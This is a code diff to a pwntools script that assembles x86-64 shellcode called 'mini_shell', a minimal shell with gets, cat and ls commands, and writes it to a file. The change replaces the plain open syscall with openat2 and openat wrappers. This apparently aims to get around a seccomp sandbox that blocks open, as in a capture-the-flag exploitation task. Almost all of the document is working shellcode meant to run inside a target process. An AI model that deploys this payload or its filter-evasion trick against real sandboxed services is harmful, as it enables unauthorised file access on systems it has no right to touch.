@@ -1,7 +1,7 @@
 mini_shell = '''
 entry:
     lea rsp,[rip - 0x7]
-    add rsp,0x2000
+    add rsp,0x1000
     call mini_shell
 /* void gets(char*buffer) */
 gets:
@@ -83,11 +83,14 @@ cat:
 
     /* buffer */
     sub rsp,0x100
+
     /* open file */
-    xor rax,rax
-    xor rsi,rsi
-    mov rax,2
-    syscall
+    xor rcx,rcx
+    mov rsi,rdi
+    xor rdx,rdx
+    mov edi,0xFFFFFF9C
+    call sys_openat2
+    
     cmp rax,-1
     je open_failed
     mov r8,rax
@@ -125,9 +128,12 @@ ls:
     /* buffer */
     sub rsp,0x200
 
-    mov rsi,65536
-    mov rax,2
-    syscall
+
+    xor rcx,rcx
+    mov rdx,65536
+    mov rsi,rdi
+    mov edi,0xFFFFFF9C
+    call sys_openat2
 
     cmp rax,-1
     je ls_failed
@@ -221,4 +227,42 @@ if_cat:
     call cat
     jmp loop_exec_cmd
 
+    /* dfd,filename,flag,mode */
+sys_openat2:
+    push r10
+    sub rsp,0x18    
+
+    xor rax,rax
+    /*how */
+    mov [rsp + 0x0],rdx
+    mov [rsp + 0x8],rcx
+    mov [rsp + 0x10],rax
+    lea rdx,[rsp]
+    
+    /* size */
+    push 0x18
+    pop r10
+
+    mov rax, SYS_openat2
+    syscall
+
+    add rsp,0x18
+    pop r10
+    ret
+
+sys_openat:
+    push r10
+    mov r10,rcx
+    mov rax, SYS_openat
+    syscall
+    pop r10
+    ret
+
 '''
+
+
+from pwn import * 
+context.arch = 'amd64'
+
+with open("./sc","wb") as f:
+    f.write(asm(mini_shell))
